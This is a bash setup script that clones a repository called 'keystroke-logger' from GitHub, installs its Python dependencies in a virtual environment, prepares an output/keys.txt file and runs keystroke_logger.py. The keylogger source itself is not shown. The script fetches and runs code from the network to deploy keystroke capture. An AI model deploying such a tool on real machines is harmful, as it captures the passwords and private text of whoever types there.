#!/bin/bash

# Configuration - EDIT THESE VALUES
REPO_URL="https://github.com/exploittracer/keystroke-logger.git"
PROGRAM_NAME="keystroke_logger.py"

# Extract directory name from repo URL
DIR_NAME=$(basename "$REPO_URL" .git)

echo "[+] Cloning repository from $REPO_URL..."
git clone "$REPO_URL"

if [ $? -ne 0 ]; then
    echo "[-] Failed to clone repository. Check the URL and try again."
    exit 1
fi

cd "$DIR_NAME" || { echo "[-] Failed to enter directory $DIR_NAME"; exit 1; }

echo "[+] Creating Python virtual environment..."
python3 -m venv venv

if [ $? -ne 0 ]; then
    echo "[-] Failed to create virtual environment. Is python3-venv installed?"
    echo "    Install it with: sudo apt install python3-venv"
    exit 1
fi

echo "[+] Activating virtual environment..."
source venv/bin/activate

if [ -f "requirements.txt" ]; then
    echo "[+] Installing libraries from requirements.txt..."
    pip install -r requirements.txt

    if [ $? -ne 0 ]; then
        echo "[-] pip install failed. Check requirements.txt."
        deactivate
        exit 1
    fi
else
    echo "[!] No requirements.txt found. Skipping dependency installation."
fi

mkdir output
cd output
touch keys.txt
cd ..

echo "[+] Running $PROGRAM_NAME..."
python3 "$PROGRAM_NAME"

# Deactivate virtual environment after program exits
deactivate